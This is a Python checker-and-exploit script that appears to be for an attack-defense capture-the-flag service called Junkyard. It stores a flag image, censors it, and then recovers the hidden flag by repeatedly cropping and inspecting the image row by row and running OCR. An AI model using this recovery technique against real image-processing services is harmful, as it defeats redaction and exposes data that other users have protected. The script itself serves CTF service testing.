import asyncio
import io
import json
import os
import random
from pathlib import Path

import numpy
from PIL import Image

from checker.client import JunkyardClient
from checker.ocr import OcrEngine
from checker.utils import random_username, random_password
from flag_gen import rnd_flag, gen_string_bitmap

URL = "http://localhost:9300"


def export_as_32(img):
    # TODO replace with real encoder once ready
    i = random.randint(0, 9999999)
    try:
        img.save(f"/dev/shm/{i}.png")
        os.system(f"convert /dev/shm/{i}.png /dev/shm/{i}.bmp")
        return Path(f"/dev/shm/{i}.bmp").read_bytes()
    finally:
        Path(f"/dev/shm/{i}.png").unlink(missing_ok=True)
        Path(f"/dev/shm/{i}.bmp").unlink(missing_ok=True)


async def store_image_flag(flag: str) -> str:
    client = JunkyardClient(URL)
    await client.register(random_username(), random_password())
    image = export_as_32(gen_string_bitmap(flag))
    filename = await client.upload(image)
    await client.process("Censor", filename, "base", {"x": 13, "y": 5, "w": 25 * 30, "h": 40})
    return filename


async def exploit_image_flag(filename: str) -> str:
    client = JunkyardClient(URL)
    await client.register(random_username(), random_password())
    result = await client.process("Inspector", filename, "base")
    image = Image.open(io.BytesIO(result))
    imagedata = numpy.array(image)

    # TODO find flag area (atm: whole image)
    for y in range(45, 3, -1):
        meta2 = json.loads(await client.process(
            "Cropper", filename, "base",
            {"t": 0, "r": 0, "b": imagedata.shape[0] - y, "l": 0}
        ))
        result2 = await client.process("Inspector", filename, meta2)
        image2 = numpy.array(Image.open(io.BytesIO(result2)))
        print(f"row {y}:", image2.shape)
        imagedata[y, :, :] = image2[-1, :, :]

    # result = Image.fromarray(imagedata)
    # result.show()

    # TODO cut image if it contains more than just the flag

    return OcrEngine().match_all(imagedata)


async def main():
    if True:
        flag = rnd_flag()
        print(f"Storing {flag}...")
        filename = await store_image_flag(flag)
    else:
        flag = "???"
        filename = "b965c373-49a4-4858-a2df-4b242d580e10"
    print(f"Filename {filename}")
    flag2 = await exploit_image_flag(filename)
    print(flag2)
    print(flag == flag2)


if __name__ == "__main__":
    asyncio.run(main())
